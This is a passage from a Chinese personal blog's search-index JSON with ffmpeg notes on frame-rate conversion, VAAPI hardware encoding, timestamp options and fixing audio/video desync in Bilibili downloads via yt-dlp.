\u8fd9\u4f4d\u8001\u54e5\u7684\u9700\u6c42\u65f6\u5c0624fps\u7684\u89c6\u9891\u8f6c\u621025fps\uff0c\u8981\u6c42\u5355\u7eaf\u53ea\u662f\u52a0\u901f\uff0c\u4e0d\u6539\u53d8frame\u5185\u5bb9\u3002\u7531\u4e8e\u6539\u53d8\u4e86video\u7684\u901f\u7387\uff0c\u56e0\u6b64\u4e5f\u8981\u540c\u65f6\u6539\u53d8audio\u7684\u901f\u7387\uff0c\u6700\u540e\u7684\u7ed3\u679c\u547d\u4ee4 - \u6709\u8001\u54e5\u8bf4-r\u4e0d\u662f\u5f88\u53ef\u9760\uff0c\u5efa\u8bae\u4f7f\u7528<code>-vf setpts=PTS*0.8</code> - \u8fd8\u6709\u8001\u54e5\u63d0\u8bae\u6d4b\u8bd5\u4ee5\u4e0b<code>asetpts</code> filter\u662f\u5426\u53ef\u4ee5 <pre><code>ffmpeg -r 25 -i input_24fps.mov -af asetrate=50000,aresample=48000\u00a0-c:v  \nprores -profile:v 3 -c:a pcm_s24le output_25fps_resampledaudio.mov\n</code></pre></p> <p>What is video timescale, timebase, or timestamp in ffmpeg? - Stack Overflow - \u6bcfframe\u5305\u542btimestamp\u4fe1\u606f\u3002Presentation\u00a0TimeStamps\uff0c\u8868\u793a\u5176\u5e94\u8be5\u663e\u793a\u7684\u65f6\u95f4\uff1f - For the sake of precise resolution of these time values, a timebase is used\u3002\u6bd4\u59821/75\u4e3a\u5355\u4f4d - timescale\u5373timebase\u7684\u5012\u6570\uff0cFFmpeg shows the timescale as the\u00a0<code>tbn</code>\u00a0value in the readout of a stream.</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#gpu\u786c\u4ef6\u52a0\u901f","title":"GPU\u786c\u4ef6\u52a0\u901f","text":"<p>\u6d4b\u8bd5\u89c6\u9891\uff1aBig Buck Bunny \u00bb Download (blender.org)</p> <p>\u5f3a\u70c8\u63a8\u8350\uff1aHardware/VAAPI \u2013 FFmpeg</p> <p>https://wiki.libav.org/Hardware/vaapi</p> <p>https://www.hardening-consulting.com/en/posts/20170625-using-vaapi-with-ffmpeg.html</p> <p>\u67e5\u770b\u652f\u6301\u7684h264\u7f16\u89e3\u7801 <pre><code>ffmpeg -codecs|grep 264\n\nDEV.LS h264                 H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10 (decoders: h264 h264_v4l2m2m h264_qsv h264_cuvid ) (encoders: libx264 libx264rgb h264_nvenc h264_omx h264_qsv h264_v4l2m2m h264_vaapi )\n</code></pre></p> <p>\u4e0b\u8f7dh265\u6d4b\u8bd5\u89c6\u9891 MP4 ( H.265 ) | Test Videos (test-videos.co.uk)</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#vaapi\u6d4b\u8bd5","title":"vaapi\u6d4b\u8bd5","text":"<p>\u4f7f\u7528vaapi\u9700\u8981\u4ee5\u4e0b\u5e93 <pre><code>apt install va-driver-all mesa-va-drivers\n</code></pre></p> <p>\u57fa\u672c\u6d4b\u8bd5\uff0c\u6d4b\u8bd5\u6743\u9650\u4e4b\u7c7b\u7684 <pre><code>ffmpeg -init_hw_device vaapi=va:/dev/dri/renderD128\n</code></pre></p> <p>\u8c03\u7528vaapi\u52a0\u901f\u7f16\u7801 <pre><code>ffmpeg -y -vaapi_device /dev/dri/renderD128 -i Big_Buck_Bunny_1080_10s_30MB.mp4 -vf 'format=nv12,hwupload' -c:v h264_vaapi output.mp4\n\nffmpeg -y -i Big_Buck_Bunny_1080_10s_30MB.mp4 -c:v libx264 output.mp4\n</code></pre> \u5982\u679c\u8bbe\u5907\u652f\u6301\u786c\u4ef6\u89e3\u7801 -  hwaccel vaapi\u6307\u5b9a\u4f7f\u7528\u786c\u4ef6\u89e3\u7801 <pre><code>ffmpeg -hwaccel vaapi -hwaccel_output_format vaapi -hwaccel_device /dev/dri/renderD128 -i input.mp4 -c:v h264_vaapi output.mp4\n</code></pre></p> <ul> <li>n5105 UHD\u6838\u663e\uff0c\u8f6c\u7801big bunny 1080p 30fps, 25Mb/s\u7801\u7387\u5927\u698250fps</li> <li>\u4f7f\u7528cpu\u8f6c\u5219\u53ea\u670913fps</li> </ul> <p>vainfo <pre><code>error: can't connect to X server!\nlibva info: VA-API version 1.7.0\nlibva info: Trying to open /usr/lib/x86_64-linux-gnu/dri/radeonsi_drv_video.so\nlibva info: Found init function __vaDriverInit_1_7\nlibva info: va_openDriver() returns 0\nvainfo: VA-API version: 1.7 (libva 2.6.0)\nvainfo: Driver version: Mesa Gallium driver 21.2.6 for AMD Radeon (TM) R7 M340 (ICELAND, DRM 3.42.0, 5.15.0-86-generic, LLVM 12.0.0)\nvainfo: Supported profile and entrypoints\n      VAProfileMPEG2Simple            : VAEntrypointVLD\n      VAProfileMPEG2Main              : VAEntrypointVLD\n      VAProfileNone                   : VAEntrypointVideoProc\n</code></pre></p> <p>n5105 <pre><code>root@n5105-pve \u279c  test vainfo\nerror: can't connect to X server!\nlibva info: VA-API version 1.17.0\nlibva info: Trying to open /usr/lib/x86_64-linux-gnu/dri/iHD_drv_video.so\nlibva info: Found init function __vaDriverInit_1_17\nlibva info: va_openDriver() returns 0\nvainfo: VA-API version: 1.17 (libva 2.12.0)\nvainfo: Driver version: Intel iHD driver for Intel(R) Gen Graphics - 23.1.1 ()\nvainfo: Supported profile and entrypoints\n      VAProfileNone                   : VAEntrypointVideoProc\n      VAProfileNone                   : VAEntrypointStats\n      VAProfileMPEG2Simple            : VAEntrypointVLD\n      VAProfileMPEG2Main              : VAEntrypointVLD\n      VAProfileH264Main               : VAEntrypointVLD\n      VAProfileH264Main               : VAEntrypointEncSliceLP\n      VAProfileH264High               : VAEntrypointVLD\n      VAProfileH264High               : VAEntrypointEncSliceLP\n      VAProfileJPEGBaseline           : VAEntrypointVLD\n      VAProfileJPEGBaseline           : VAEntrypointEncPicture\n      VAProfileH264ConstrainedBaseline: VAEntrypointVLD\n      VAProfileH264ConstrainedBaseline: VAEntrypointEncSliceLP\n      VAProfileVP8Version0_3          : VAEntrypointVLD\n      VAProfileHEVCMain               : VAEntrypointVLD\n      VAProfileHEVCMain               : VAEntrypointEncSliceLP\n      VAProfileHEVCMain10             : VAEntrypointVLD\n      VAProfileHEVCMain10             : VAEntrypointEncSliceLP\n      VAProfileVP9Profile0            : VAEntrypointVLD\n      VAProfileVP9Profile0            : VAEntrypointEncSliceLP\n      VAProfileVP9Profile1            : VAEntrypointVLD\n      VAProfileVP9Profile1            : VAEntrypointEncSliceLP\n      VAProfileVP9Profile2            : VAEntrypointVLD\n      VAProfileVP9Profile2            : VAEntrypointEncSliceLP\n      VAProfileVP9Profile3            : VAEntrypointVLD\n      VAProfileVP9Profile3            : VAEntrypointEncSliceLP\n      VAProfileHEVCMain422_10         : VAEntrypointVLD\n      VAProfileHEVCMain444            : VAEntrypointVLD\n      VAProfileHEVCMain444            : VAEntrypointEncSliceLP\n      VAProfileHEVCMain444_10         : VAEntrypointVLD\n      VAProfileHEVCMain444_10         : VAEntrypointEncSliceLP\n</code></pre></p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u65f6\u95f4\u6233\u76f8\u5173","title":"\u65f6\u95f4\u6233\u76f8\u5173","text":"<p>DTS\u89e3\u7801\u65f6\u95f4\u6233 <pre><code>[matroska @ 0x55a111e20440] Non-monotonous DTS in output stream 0:1; previous: 565, current: 564; changing to 565. This may result in incorrect timestamps in the output file.\n</code></pre></p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u9009\u9879","title":"\u9009\u9879","text":"<p>-copyts</p> <p>Do not process input timestamps, but keep their values without trying to sanitize them. In particular, do not remove the initial start time offset value.</p> <p>Note that, depending on the\u00a0vsync\u00a0option or on specific muxer processing (e.g. in case the format option\u00a0avoid_negative_ts\u00a0is enabled) the output timestamps may mismatch with the input timestamps even when this option is selected.</p> <p>-start_at_zero</p> <p>When used with\u00a0copyts, shift input timestamps so they start at zero.</p> <p>This means that using e.g.\u00a0<code>-ss 50</code>\u00a0will make output timestamps start at 50 seconds, regardless of what timestamp the input file started at.</p> <p>-copytb\u00a0mode</p> <p>Specify how to set the encoder timebase when stream copying.\u00a0mode\u00a0is an integer numeric value, and can assume one of the following values:</p> <p>1</p> <p>Use the demuxer timebase.</p> <p>The time base is copied to the output encoder from the corresponding input demuxer. This is sometimes required to avoid non monotonically increasing timestamps when copying video streams with variable frame rate.</p> <p>0</p> <p>Use the decoder timebase.</p> <p>The time base is copied to the output encoder from the corresponding input decoder.</p> <p>-1</p> <p>Try to make the choice automatically, in order to generate a sane output.</p> <p>Default value is -1.</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#ffmpeg\u8f93\u51fa\u65f6\u95f4\u6233\u9ed8\u8ba4\u4f1a\u7f6e\u4e3a0","title":"ffmpeg\u8f93\u51fa\u65f6\u95f4\u6233\u9ed8\u8ba4\u4f1a\u7f6e\u4e3a0","text":"<p>ffmpeg demux into audio and video resets PTS - Stack Overflow - ffmpeg\u5206\u79bbvideo\u65f6\u4f1areset timestamp\uff1f</p> <p>\u6784\u9020\u4e00\u4e2astart\u4e3a1h\u7684\u89c6\u9891 <pre><code>ffmpeg -i bbb_sunflower_1080p_30fps_normal.mp4 -c copy -output_ts_offset 3600 test.mkv\n</code></pre></p> <p>\u67e5\u770b\u786e\u5b9estart_time = 3600 - \u4f7f\u7528mpv\u64ad\u653e\u8fdb\u5ea6\u6761\u4ecd\u4e3a0 - \u4f7f\u7528windows\u81ea\u5e26\u7684\u89c6\u9891\u64ad\u653e\u5668\uff0c\u8fdb\u5ea6\u6761\u786e\u5b9e\u4ece1h\u5f00\u59cb - \u6587\u4ef6\u7ba1\u7406\u5668\u663e\u793a\u7684\u89c6\u9891\u65f6\u5e38\u4e5f\u786e\u5b9e\u589e\u52a0\u4e861h <pre><code>Input #0, matroska,webm, from 'test.mkv':\n  Metadata:\n    title           : Big Buck Bunny, Sunflower version\n    GENRE           : Animation\n    MAJOR_BRAND     : isom\n    MINOR_VERSION   : 1\n    COMPATIBLE_BRANDS: isomavc1\n    COMPOSER        : Sacha Goedegebure\n    ARTIST          : Blender Foundation 2008, Janus Bager Kristensen 2013\n    COMMENT         : Creative Commons Attribution 3.0 - http://bbb3d.renderfarming.net\n    ENCODER         : Lavf58.76.100\n  Duration: 01:10:34.60, start: 3600.000000, bitrate: 497 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(progressive), 1920x1080 [SAR 1:1 DAR 16:9], 30 fps, 30 tbr, 1k tbn, 60 tbc (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Video Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 01:10:34.600000000\n  Stream #0:1: Audio: ac3, 48000 Hz, 5.1(side), fltp, 320 kb/s (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Audio Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 01:10:34.144000000\nstart_pts=3600067\nstart_time=3600.067000\nstart_pts=3600000\nstart_time=3600.000000\n</code></pre></p> <p>ffmpeg\u590d\u5236\u4e00\u4e0b <pre><code>ffmpeg -i test.mkv -c copy test_copy.mkv\n</code></pre></p> <p>\u786e\u5b9estart\u88ab\u7f6e\u4e3a0\u4e86\uff0c\u5373 <pre><code>Input #0, matroska,webm, from 'test_copy.mkv':\n  Metadata:\n    title           : Big Buck Bunny, Sunflower version\n    COMMENT         : Creative Commons Attribution 3.0 - http://bbb3d.renderfarming.net\n    GENRE           : Animation\n    MAJOR_BRAND     : isom\n    MINOR_VERSION   : 1\n    COMPATIBLE_BRANDS: isomavc1\n    COMPOSER        : Sacha Goedegebure\n    ARTIST          : Blender Foundation 2008, Janus Bager Kristensen 2013\n    ENCODER         : Lavf58.76.100\n  Duration: 00:10:34.60, start: 0.000000, bitrate: 3321 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(progressive), 1920x1080 [SAR 1:1 DAR 16:9], 30 fps, 30 tbr, 1k tbn, 60 tbc (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Video Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:10:34.600000000\n  Stream #0:1: Audio: ac3, 48000 Hz, 5.1(side), fltp, 320 kb/s (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Audio Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:10:34.144000000\nstart_pts=67\nstart_time=0.067000\nstart_pts=0\nstart_time=0.000000\n</code></pre></p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#ffmpeg\u5408\u5e76\u89c6\u9891\u548c\u97f3\u9891\u9ed8\u8ba4\u5c45\u7136\u4f1a\u6709\u95ee\u9898","title":"ffmpeg\u5408\u5e76\u89c6\u9891\u548c\u97f3\u9891\uff0c\u9ed8\u8ba4\u5c45\u7136\u4f1a\u6709\u95ee\u9898","text":"<p>\u5c06\u89c6\u9891\u5206\u89e3\u4e3a\u89c6\u9891\u548c\u97f3\u9891 <pre><code>ffmpeg -i bbb_sunflower_1080p_30fps_normal.mkv -vn -c copy a.m4a -an -c copy a.mkv\n</code></pre></p> <p>\u5bf9\u97f3\u9891\u8fdb\u884c\u622a\u5207\u548c\u504f\u79fb\uff08\u526a\u6389\u524d1.7s\uff0c\u540c\u65f6\u5f80\u53f3\u504f\u79fb1.7s\uff0c\u56e0\u6b64\u76f8\u5bf9\u4e8ebase\u8fd8\u662f\u540c\u6b65\u7684\uff09 <pre><code>ffmpeg -ss 1.7 -itsoffset 1.7 -i a.m4a -c copy b.m4a\n</code></pre></p> <pre><code>Input #0, mov,mp4,m4a,3gp,3g2,mj2, from 'b.m4a':\n  Metadata:\n    major_brand     : M4A\n    minor_version   : 512\n    compatible_brands: M4A isomiso2\n    title           : Big Buck Bunny, Sunflower version\n    artist          : Blender Foundation 2008, Janus Bager Kristensen 2013\n    composer        : Sacha Goedegebure\n    encoder         : Lavf58.76.100\n    comment         : Creative Commons Attribution 3.0 - http://bbb3d.renderfarming.net\n    genre           : Animation\n  Duration: 00:10:34.14, start: 1.696000, bitrate: 319 kb/s\n  Stream #0:0(und): Audio: ac3 (ac-3 / 0x332D6361), 48000 Hz, 5.1(side), fltp, 320 kb/s (default)\n    Metadata:\n      handler_name    : GPAC ISO Audio Handler\n      vendor_id       : [0][0][0][0]\n    Side data:\n      audio service type: main\nstart_pts=81408\nstart_time=1.696000\n</code></pre> <p>\u5c06\u539f\u672c\u89c6\u9891\u548c\u97f3\u9891\u5408\u5e76 <code>ffmpeg -i a.mkv -i b.m4a -c copy merge2.mkv</code> - ffmpeg\u76f4\u63a5\u5ffd\u89c6\u4e86input\u7684\u65f6\u95f4\u6233\uff0c\u5c06\u5176\u8ba4\u4e3a\u662f\u4ece0\u5f00\u59cb\u7684\uff0c\u7136\u540e\u5408\u5e76\u3002\u56e0\u6b64\u5bfc\u81f4\u58f0\u97f3\u76f8\u6bd4\u4e8e\u6b63\u786e\u60c5\u51b5\u63d0\u524d\u4e86\u3002 <pre><code>Input #0, matroska,webm, from 'merge.mkv':\n  Metadata:\n    title           : Big Buck Bunny, Sunflower version\n    ARTIST          : Blender Foundation 2008, Janus Bager Kristensen 2013\n    COMMENT         : Creative Commons Attribution 3.0 - http://bbb3d.renderfarming.net\n    GENRE           : Animation\n    MAJOR_BRAND     : isom\n    MINOR_VERSION   : 1\n    COMPATIBLE_BRANDS: isomavc1\n    COMPOSER        : Sacha Goedegebure\n    ENCODER         : Lavf58.76.100\n  Duration: 00:10:34.53, start: 0.000000, bitrate: 3321 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(progressive), 1920x1080 [SAR 1:1 DAR 16:9], 30 fps, 30 tbr, 1k tbn, 60 tbc (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Video Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:10:34.533000000\n  Stream #0:1: Audio: ac3, 48000 Hz, 5.1(side), fltp, 320 kb/s (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Audio Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:10:32.448000000\nstart_pts=0\nstart_time=0.000000\nstart_pts=0\nstart_time=0.000000\n</code></pre></p> <p>\u6b63\u786e\u5408\u5e76 <code>ffmpeg -i a.mkv -i b.m4a -copyts -c copy merge2.mkv</code> <pre><code>Input #0, matroska,webm, from 'merge2.mkv':\n  Metadata:\n    title           : Big Buck Bunny, Sunflower version\n    ARTIST          : Blender Foundation 2008, Janus Bager Kristensen 2013\n    COMMENT         : Creative Commons Attribution 3.0 - http://bbb3d.renderfarming.net\n    GENRE           : Animation\n    MAJOR_BRAND     : isom\n    MINOR_VERSION   : 1\n    COMPATIBLE_BRANDS: isomavc1\n    COMPOSER        : Sacha Goedegebure\n    ENCODER         : Lavf58.76.100\n  Duration: 00:10:34.60, start: 0.067000, bitrate: 3320 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(progressive), 1920x1080 [SAR 1:1 DAR 16:9], 30 fps, 30 tbr, 1k tbn, 60 tbc (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Video Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:10:34.600000000\n  Stream #0:1: Audio: ac3, 48000 Hz, 5.1(side), fltp, 320 kb/s (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Audio Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:10:34.144000000\nstart_pts=67\nstart_time=0.067000\nstart_pts=1696\nstart_time=1.696000\n</code></pre></p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#delay\u67d0\u4e2a\u6d41","title":"delay\u67d0\u4e2a\u6d41","text":"<p>\u5f3a\u884c\u5c06\u97f3\u9891delay 0.613s\uff0c\u53ef\u4ee5\u5bfc\u81f4\u4e0d\u540c\u6b65 <pre><code>(base) fyyuan@icarus4 \u279c  reset_pts ffmpeg -i ../src.mkv -itsoffset 0.613 -i ../src.mkv -map 0:0 -map 1:1 -c copy -shortest output_video_adjusted.mkv\n\nInput #0, matroska,webm, from 'output_video_adjusted.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.15, start: 0.613000, bitrate: 24908 kb/s\n  Stream #0:0: Video: hevc (Main 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 59.94 tbc (default)\n    Metadata:\n      DURATION        : 00:08:41.149000000\n  Stream #0:1: Audio: aac_latm (LC) ([2][22][0][0] / 0x1602), 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      DURATION        : 00:08:41.018000000\nstart_pts=613\nstart_time=0.613000\nstart_pts=613\nstart_time=0.613000\n</code></pre></p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#b\u7ad9\u95ee\u9898","title":"B\u7ad9\u95ee\u9898","text":"","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u4e3a\u4ec0\u4e48seek-0638s\u7ed3\u679c\u5bfc\u81f4video\u8d77\u59cb\u53d8\u6210\u4e8641s","title":"\u4e3a\u4ec0\u4e48seek 0.638s\uff0c\u7ed3\u679c\u5bfc\u81f4video\u8d77\u59cb\u53d8\u6210\u4e864.1s","text":"<p>\u73b0\u8c61\u5c31\u662f\u89c6\u9891\u5c11\u4e864s\uff0cmpv\u64ad\u653e\u65f6\u8d77\u59cb\u76f4\u63a5\u53d8\u6210\u4e864s <pre><code>Input #0, matroska,webm, from 'src.hevc.aac.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.18, start: 0.000000, bitrate: 11146 kb/s\n  Stream #0:0: Video: hevc (Main 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10, progressive), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 59.94 tbc (default)\n    Metadata:\n      ENCODER         : Lavc58.134.100 libx265\n      DURATION        : 00:08:41.175000000\n  Stream #0:1: Audio: aac (LC), 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      ENCODER         : Lavc58.134.100 aac\n      DURATION        : 00:08:41.023000000\nstart_pts=638\nstart_time=0.638000\nstart_pts=0\nstart_time=0.000000\n</code></pre></p> <pre><code>ffmpeg -i src.hevc.aac.mkv -ss 0.638 -c copy cut.hevc.aac.ss638.mkv\n</code></pre> <pre><code>Input #0, matroska,webm, from 'cut.hevc.aac.ss638.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:40.54, start: 0.002000, bitrate: 10998 kb/s\n  Stream #0:0: Video: hevc (Main 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10, progressive), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 59.94 tbc (default)\n    Metadata:\n      ENCODER         : Lavc58.134.100 libx265\n      DURATION        : 00:08:40.536000000\n  Stream #0:1: Audio: aac (LC), 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      ENCODER         : Lavc58.134.100 aac\n      DURATION        : 00:08:40.385000000\nstart_pts=4171\nstart_time=4.171000\nstart_pts=2\nstart_time=0.002000\n</code></pre> <p>\u6000\u7591\u662fseek\uff0cseek\u5230\u4e0b\u4e00\u4e2a\u5173\u952e\u5e27\u4e86\uff0c\u5bfc\u81f4\u4e22\u5931\u4e86\u5173\u952e\u5e27\u524d\u7684\u6240\u6709\u6570\u636e\uff08\u867d\u7136chatgpt\u544a\u8bc9\u6211seek\u662fseek\u5230\u4e4b\u524d\u7684\u5173\u952e\u5e27\uff09</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u611f\u89c9\u95ee\u9898\u5728\u4e8e\u4e3a\u4ec0\u4e48\u81ea\u5df1\u7684\u89c6\u9891video\u548caudio-duration\u76f8\u5dee\u6ca1\u90a3\u4e48\u5927\u800cb\u7ad9\u8f6c\u7801\u540e\u5c31\u76f8\u5dee05s\u4e86","title":"\u611f\u89c9\u95ee\u9898\u5728\u4e8e\u4e3a\u4ec0\u4e48\u81ea\u5df1\u7684\u89c6\u9891video\u548caudio duration\u76f8\u5dee\u6ca1\u90a3\u4e48\u5927\uff0c\u800cB\u7ad9\u8f6c\u7801\u540e\uff0c\u5c31\u76f8\u5dee0.5s\u4e86","text":"<p>\u5206p\u7248\u672c \u6e90\u6587\u4ef6 <pre><code>Input #0, matroska,webm, from 'p09.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.15, start: 0.000000, bitrate: 24909 kb/s\n  Stream #0:0: Video: hevc (Main 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 59.94 tbc (default)\n    Metadata:\n      DURATION        : 00:08:41.149000000\n  Stream #0:1: Audio: aac_latm (LC) ([2][22][0][0] / 0x1602), 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      DURATION        : 00:08:41.002000000\nstart_pts=613\nstart_time=0.613000\nstart_pts=0\nstart_time=0.000000\n</code></pre></p> <p>b\u7ad9\u4e0b\u8f7d\u7684 <pre><code>\u279c  yt-dlp ./yt-dlp https://www.bilibili.com/video/BV1dG411z7sc -F -I 9\n[BiliBili] Extracting URL: https://www.bilibili.com/video/BV1dG411z7sc\n[BiliBili] 1dG411z7sc: Downloading webpage\n[BiliBili] BV1dG411z7sc: Extracting videos in anthology\n[BiliBili] Downloading playlist BV1dG411z7sc - add --no-playlist to download just the video BV1dG411z7sc\n[download] Downloading playlist: \u3010\u7b2c73\u56deNHK\u7d05\u767d\u6b4c\u5408\u6226 BS4K\u3011\u8282\u9009\n[BiliBili] Playlist \u3010\u7b2c73\u56deNHK\u7d05\u767d\u6b4c\u5408\u6226 BS4K\u3011\u8282\u9009: Downloading 1 items\n[download] Downloading item 1 of 1\n[BiliBili] Extracting URL: https://www.bilibili.com/video/BV1dG411z7sc?p=9\n[BiliBili] 1dG411z7sc: Downloading webpage\n[BiliBili] BV1dG411z7sc: Extracting videos in anthology\n[BiliBili] 410742370: Extracting chapters\n[info] Available formats for BV1dG411z7sc_p9:\nID    EXT RESOLUTION FPS \u2502   FILESIZE    TBR PROTO \u2502 VCODEC         VBR ACODEC      ABR\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n30216 m4a audio only     \u2502 \u2248  2.51MiB    39k https \u2502 audio only         mp4a.40.5   39k\n30232 m4a audio only     \u2502 \u2248  5.88MiB    92k https \u2502 audio only         mp4a.40.2   92k\n30280 m4a audio only     \u2502 \u2248  9.87MiB   155k https \u2502 audio only         mp4a.40.2  155k\n30016 mp4 640x360     30 \u2502 \u2248 23.35MiB   367k https \u2502 avc1.64001E   367k video only\n30032 mp4 852x480     30 \u2502 \u2248 52.44MiB   824k https \u2502 avc1.64001F   824k video only\n30064 mp4 1280x720    30 \u2502 \u2248116.21MiB  1827k https \u2502 avc1.640028  1827k video only\n30080 mp4 1920x1080   30 \u2502 \u2248173.36MiB  2725k https \u2502 avc1.640032  2725k video only\n30116 mp4 1920x1080   59 \u2502 \u2248346.03MiB  5439k https \u2502 avc1.640032  5439k video only\n30120 mp4 3840x2160   59 \u2502 \u2248  1.16GiB 18644k https \u2502 avc1.640034 18644k video only\n[download] Finished downloading playlist: \u3010\u7b2c73\u56deNHK\u7d05\u767d\u6b4c\u5408\u6226 BS4K\u3011\u8282\u9009\n</code></pre> (\u8fd9\u91cc\u662fyt-dlp\u7684bug\uff0c\u9700\u8981\u52a0copyts\uff0c\u5426\u5219\u5408\u5e76\u65f6\u4f1a\u4e22\u5f03input timestamp\u3002\u4e0d\u8fc7\u6211\u8bd5\u4e86\u624b\u52a8merge\uff0c\u8c8c\u4f3c\u4ecd\u7136\u4e0d\u540c\u6b65\uff0c\u8fd9\u6b21\u53d8\u6210\u97f3\u9891\u8981\u5feb\u4e00\u70b9) <pre><code>Input #0, matroska,webm, from 'bili-p09.mkv':\n  Metadata:\n    DESCRIPTION     : Packed by Bilibili XCoder v2.0.2\n    MAJOR_BRAND     : iso5\n    MINOR_VERSION   : 1\n    COMPATIBLE_BRANDS: avc1iso5dsmsmsixdash\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.05, start: 0.000000, bitrate: 18779 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(tv, bt709, progressive), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 119.88 tbc (default)\n    Metadata:\n      HANDLER_NAME    : VideoHandler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:08:40.539000000\n  Stream #0:1: Audio: aac (LC), 48000 Hz, stereo, fltp (default)\n    Metadata:\n      HANDLER_NAME    : SoundHandler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:08:41.045000000\nstart_pts=0\nstart_time=0.000000\nstart_pts=0\nstart_time=0.000000\n</code></pre> \u624b\u52a8\u5408\u5e76\u7684\uff08\u8fd9\u91cc\u76841.226\u4e0d\u5c31\u662f0.613\u7684\u4e24\u500d\u5417\uff09\uff08\u679c\u7136\uff0c\u5c06\u97f3\u9891delay +600ms\u540e\uff0c\u5c31\u5f88\u540c\u6b65\u4e86\uff09 <pre><code>Input #0, matroska,webm, from 'p9.mkv':\n  Metadata:\n    DESCRIPTION     : Packed by Bilibili XCoder v2.0.2\n    MAJOR_BRAND     : iso5\n    MINOR_VERSION   : 1\n    COMPATIBLE_BRANDS: avc1iso5dsmsmsixdash\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.77, start: 0.000000, bitrate: 18753 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(tv, bt709, progressive), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 119.88 tbc (default)\n    Metadata:\n      HANDLER_NAME    : VideoHandler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:08:41.765000000\n  Stream #0:1: Audio: aac (LC), 48000 Hz, stereo, fltp (default)\n    Metadata:\n      HANDLER_NAME    : SoundHandler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:08:41.045000000\nstart_pts=1226\nstart_time=1.226000\nstart_pts=0\nstart_time=0.000000\n</code></pre></p> 